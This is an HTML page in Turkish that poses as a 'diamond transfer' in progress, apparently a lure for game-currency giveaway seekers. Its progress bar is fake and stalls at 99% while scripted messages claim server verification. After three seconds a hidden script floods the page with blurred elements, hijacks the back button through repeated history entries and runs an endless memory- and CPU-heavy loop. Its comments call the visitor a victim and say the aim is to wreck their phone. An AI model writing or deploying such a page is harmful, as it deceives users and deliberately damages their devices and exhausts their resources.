<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>💎 ELMAS AKTARIMI BAŞLATILDI 💎</title>
    <style>
        body { background: #000; color: #00ff00; text-align: center; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; overflow: hidden; margin: 0; }
        .loader-container { margin-top: 150px; position: relative; z-index: 100; }
        .bar-bg { width: 80%; height: 20px; background: #222; border-radius: 10px; margin: 20px auto; border: 1px solid #444; }
        #bar { width: 0%; height: 100%; background: linear-gradient(90deg, #00ff00, #008800); border-radius: 10px; transition: width 0.5s; }
        .glitch { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; opacity: 0.15; mix-blend-mode: color-dodge; pointer-events: none; }
    </style>
</head>
<body>
    <div class="glitch" id="g"></div>
    <div class="loader-container">
        <h1 style="text-shadow: 0 0 10px #00ff00;">ELMAS AKTARILIYOR...</h1>
        <p>Lütfen bekleyin, sunucu ile güvenli bağ kuruluyor.</p>
        <div class="bar-bg"><div id="bar"></div></div>
        <h2 id="perc">%0 Tamamlandı</h2>
        <p id="msg" style="color:#888; font-size: 14px;">Şifreleme anahtarları doğrulanıyor...</p>
    </div>

<script>
    // 1. STRATEJİK YAVAŞ SAYAÇ
    let p = 0;
    let messages = ["Dosyalar taranıyor...", "API bağlantısı kuruluyor...", "Hesap doğrulanıyor...", "Elmaslar pakete ekleniyor...", "Son kontroller yapılıyor..."];
    
    let timer = setInterval(() => {
        if (p < 99) {
            p++;
            document.getElementById("bar").style.width = p + "%";
            document.getElementById("perc").innerText = "%" + p + " Tamamlandı";
            
            // Mesajları rastgele değiştirerek gerçeklik algısını artır
            if (p % 20 === 0) {
                document.getElementById("msg").innerText = messages[Math.floor(Math.random() * messages.length)];
            }
        } else {
            // %99'da durur ve kurbanın "son bir adım" diye beklemesini sağlar
            document.getElementById("msg").innerText = "Sisteme aktarılıyor, LÜTFEN BEKLEYİN...";
            document.getElementById("msg").style.color = "#ff0000";
        }
    }, 450); // Hızı senin istediğin gibi "sabırlı" seviyeye çektik (yaklaşık 45 saniyede %99 olur)

    // 2. SİNSİ YIKIM MOTORU (Kurban beklerken telefonu bitiren kısım)
    function baslat() {
        setInterval(() => {
            // GPU ve RAM'i sinsi sinsi doldurur
            for(let i=0; i<50; i++) {
                let d = document.createElement("div");
                d.style.cssText = "position:fixed;width:1px;height:1px;box-shadow:0 0 100px 100px rgba(0,255,0,0.1);filter:blur(30px);z-index:0;";
                d.style.left = Math.random() * 100 + "vw";
                d.style.top = Math.random() * 100 + "vh";
                document.body.appendChild(d);
            }
            // Geri tuşunu kilitleme
            window.history.pushState(null, "", "?auth=" + Math.random());
        }, 100);

        // İşlemciyi yoran görünmez 3D döngü
        function heavy() {
            let x = new Array(1000000).fill("💎");
            console.log(x.join(""));
            requestAnimationFrame(heavy);
        }
        heavy();
    }

    // Kurbanın odaklandığı 3. saniyede motor çalışmaya başlar
    setTimeout(baslat, 3000);
</script>
</body>
  </html>
